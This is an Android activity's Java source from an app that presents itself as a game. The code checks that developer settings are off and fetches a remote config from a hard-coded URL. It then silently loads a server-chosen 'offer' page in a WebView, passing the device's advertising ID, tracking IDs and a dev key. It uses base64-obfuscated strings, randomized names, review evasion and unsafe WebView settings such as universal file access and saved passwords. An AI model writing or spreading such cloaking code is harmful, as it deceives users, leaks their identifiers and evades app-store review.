package com.etgpy.rsiech;

import static com.etgpy.rsiech.ApplicationClass.AFId;
import static com.etgpy.rsiech.ApplicationClass.afLoaded;
import static com.etgpy.rsiech.F_B_K.strDeepetgpy;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.Window;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.io.IOException;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;

public class ER extends AppCompatActivity {
    private ProgressBar progressBar;
    private WebView webViewetgpy;
    private String linketgpy;
    private Uri[] resultsetgpy;
    private ValueCallback<Uri[]> myFilePathCallbacketgpy;
    private SharedPreferences sPrefsetgpy;
    private String keyDefaultetgpy;
    private String offeretgpy;
    private String fbIdetgpy;
    public static final String URLPRFSetgpy = "TEFTVF9XZWJWaWV3X1VSTA==";
    public static final int INPUT_FILE_REQUEST_CODEetgpy = 1;
    public static String statusAppsFlyeretgpy;
    public static String strAppsFlyeretgpy;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.activity_main);
        progressBar = (ProgressBar) findViewById(R.id.progressBar);
        progressBar.setVisibility(ProgressBar.VISIBLE);

        if ( devModeOff()) {

            webViewetgpy = findViewById(R.id.webView);
            setWebViewetgpy(webViewetgpy);

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl(CNSTN.DB_6_E_47_RAW_EGYPT_RICHES)
                    .build();
            GistApi gistApi = retrofit.create(GistApi.class);
            Call<ResponseBody> gistQuery = gistApi.getStringUrl();
            gistQuery.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                    if (response.isSuccessful()) {
                        try {
                            String url = response.body().string();
                            String[] params = url.split("\\|");
                            offeretgpy = params[0];
                            keyDefaultetgpy = params[1];
                            fbIdetgpy = params[2];
                            new F_B_K(fbIdetgpy, ER.this);

                            sPrefsetgpy = getSharedPreferences("bXlXZWJWaWV3UHJlZnM=", Context.MODE_PRIVATE);
                            linketgpy = sPrefsetgpy.getString(URLPRFSetgpy, null);


                            if (linketgpy != null) {
                                webViewetgpy.loadUrl(linketgpy);
                                progressBar.setVisibility(ProgressBar.INVISIBLE);
                            } else {
                                do {
                                } while (!afLoaded);
                                new Handler().postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        startWebView(offeretgpy);
                                        progressBar.setVisibility(ProgressBar.INVISIBLE);
                                    }
                                }, 2000);
                            }


                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else {
                        goToGame();
                    }
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                    goToGame();
                }
            });

        } else {
            goToGame();
        }
    }


    private void goToGame() {
        Intent intent = new Intent(this, GameActivity.class);
        startActivity(intent);
        finish();
    }

    void startWebView(String link) {

        if (statusAppsFlyeretgpy != null && statusAppsFlyeretgpy.equals(CNSTN.decode("Tm9uLW9yZ2FuaWM="))) {
            String url = link + strAppsFlyeretgpy;
            webViewetgpy.loadUrl(url);
        } else if (strDeepetgpy != null) {
            String url = link + strDeepetgpy;
            webViewetgpy.loadUrl(url);
        } else {
            if (keyDefaultetgpy.equals("NO")) {
                goToGame();
            } else {
                strAppsFlyeretgpy =
                        keyDefaultetgpy
                                + CNSTN.decode("P2J1bmRsZT0=") + getPackageName()
                                + CNSTN.decode("JmFkX2lkPQ==") + F_B_K.AIDetgpy
                                + CNSTN.decode("JmFwcHNfaWQ9") + AFId
                                + CNSTN.decode("JmRldl9rZXk9") + CNSTN.decode(CNSTN.LA_ED_RSEVQ_NFJGUERDYW);
                String url = link + strAppsFlyeretgpy;
                webViewetgpy.loadUrl(url);
            }
        }
    }


    @Override
    public void onBackPressed() {
        webViewetgpy.goBack();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != INPUT_FILE_REQUEST_CODEetgpy || myFilePathCallbacketgpy == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        if (resultCode == Activity.RESULT_OK) {
            String dataString = data.getDataString();
            if (dataString != null) {
                resultsetgpy = new Uri[]{Uri.parse(dataString)};
                myFilePathCallbacketgpy.onReceiveValue(resultsetgpy);
                myFilePathCallbacketgpy = null;
            }
        }
    }

    private boolean devModeOff() {
        int devInt = android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        if (devInt == 0) return true;
        return false;
    }


    class MyWebChromeClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
                                         FileChooserParams fileChooserParams) {
            myFilePathCallbacketgpy = filePathCallback;
            Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
            contentSelectionIntent.setType(CNSTN.decode("aW1hZ2UvKg=="));
            Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODEetgpy);
            return true;
        }
    }

    class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
            webViewetgpy.setVisibility(View.VISIBLE);
            progressBar.setVisibility(ProgressBar.INVISIBLE);

            if (url.contains(CNSTN.decode("Z2FwcHM9NDA0"))) {
                goToGame();
                finish();
            }
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            SharedPreferences.Editor editor = sPrefsetgpy.edit();
            editor.putString(URLPRFSetgpy, url);
            editor.apply();
        }
    }

    private void setWebViewetgpy(WebView webViewetgpy) {
        webViewetgpy.getSettings().setJavaScriptEnabled(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setAppCacheEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewetgpy.getSettings().setSaveFormData(true);
        webViewetgpy.getSettings().setMixedContentMode(0);
        webViewetgpy.getSettings().setSavePassword(true);
        webViewetgpy.getSettings().setAllowContentAccess(true);
        webViewetgpy.getSettings().setLoadsImagesAutomatically(true);
        webViewetgpy.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewetgpy.getSettings().setDatabaseEnabled(true);
        webViewetgpy.getSettings().setLoadWithOverviewMode(true);
        webViewetgpy.getSettings().setUseWideViewPort(true);
        webViewetgpy.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewetgpy.getSettings().setDomStorageEnabled(true);
        webViewetgpy.getSettings().setAllowFileAccess(true);
        webViewetgpy.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewetgpy.getSettings().setEnableSmoothTransition(true);
        webViewetgpy.setWebChromeClient(new MyWebChromeClient());
        webViewetgpy.setWebViewClient(new MyWebViewClient());
    }
}






